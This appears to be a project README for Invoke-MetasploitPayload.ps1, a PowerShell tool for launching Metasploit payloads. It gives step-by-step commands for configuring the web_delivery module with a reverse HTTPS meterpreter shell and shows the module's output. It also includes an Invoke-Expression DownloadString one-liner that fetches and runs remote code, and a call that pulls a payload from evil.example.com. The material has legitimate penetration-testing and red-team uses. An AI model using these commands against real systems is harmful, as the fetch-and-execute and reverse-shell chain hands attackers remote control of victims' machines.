<h2 align="center">Invoke-MetasploitPayload.ps1</h2>
Invoke-MetasploitPayload is a Powershell script used to kick off a Metasploit payload. It relies on the exploit/multi/scripts/web_delivery Metasploit module.

#### The exploit/multi/scripts/web_delivery Metasploit module
The web_delivery Metasploit module generates a script for a given payload and then fires up a webserver to host said script. If the payload is a reverse shell, it will also handle starting up the listener for that payload. 

#### Example Usage
On your Metasploit instance, run the following commands

```
use exploit/multi/script/web_delivery
```
The SRVHOST and SRVPORT variables are used for running the webserver to host the script
```
set SRVHOST 0.0.0.0
set SRVPORT 8443
set SSL true
```
The `target` variable determines what type of script we're using. `2` is for PowerShell
```
set target 2
```

By default, the module will generate a random string to be used as the URL for the script webserver. You can specify your own with the URIPATH variable.

```
set URIPATH posh-payload
```

Pick your payload. In this case, we'll use a reverse https meterpreter payload
```
set payload windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
```

Run the exploit
```
run -j
```

Once run, the web_delivery module will spin up the webserver to host the script and reverse listener for our meterpreter session.

```
msf exploit(web_delivery) > run -j
[*] Exploit running as background job.

[*] Started HTTPS reverse handler on https://10.211.55.4:8443/
[*] Using URL: http://0.0.0.0:8080/posh-payload
[*] Local IP: http://10.211.55.4:8080/posh-payload
[*] Server started.
```

#### Getting the Payload URL
After running the web_delivery module, it will print out the URL for the webserver hosting the script file. If you specified a URIPATH, this will be something like `http://[IP_OF_METASPLOIT_INSTANCE]/[URIPATH]` else it will have random characters for the URL (`http://[IP_OF_METASPLOIT_INSTANCE]/[RANDOM_CHARACTERS]`).

This URL is what you'll pass to `Invoke-MetasploitPayload`. 

_**You can ignore the line about "Run the following command on the target machine"**_

![Web Delivery Example](/web_delivery_screenshot.png)

#### Using Invoke-MetasploitPayload.ps1

Usage is simple, first execute the PS1 file.

```
PS> Invoke-Expression (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/jaredhaight/Invoke-MetasploitPayload/master/Inv
oke-MetasploitPayload.ps1")
```

Then just pass the URL from the web_delivery module to Invoke-MetasploitPayload. It will handle spinning up a new process and then downloading and executing the script.
```
PS> Invoke-MetasploitPayload "http://evil.example.com/SDFJLWKS"
```

#### Acknowledgements

Invoke-MetasploitPayload is really just a repackaging of the PowerShell commands provided by the [web_delivery module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/script/web_delivery.rb) to download and execute the script. My hats off to those authors for their hard work.
